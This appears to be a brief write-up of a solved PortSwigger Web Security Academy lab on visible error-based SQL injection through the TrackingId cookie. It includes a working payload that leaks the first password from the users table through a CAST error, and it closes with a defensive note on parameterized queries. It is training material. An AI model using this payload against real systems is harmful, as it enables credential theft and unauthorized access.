# PortSwigger SQL Injection — Visible error-based SQL injection

- Platform: PortSwigger Web Security Academy
- Category: SQL injection
- Difficulty: PRACTITIONER
- Result: solved

## Technique

visible CAST error

## Key details

- Injection/object: `TrackingId`
- Table/columns/channel: `short payload without TrackingId prefix`
- Key result: `k70vp9tffar50wjz3vwv`

## Payload

```text
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 
```

## Notes

This lab belongs to the advanced half of PortSwigger's SQL injection track. The workflow is to identify the available oracle or output channel, extract the administrator credential if required, and log in as administrator to trigger the solved state.

## Defensive takeaway

Parameterized queries are the root fix. Error suppression, WAF filters, and metadata permission reduction are useful defense-in-depth, but they do not replace binding untrusted input as data.
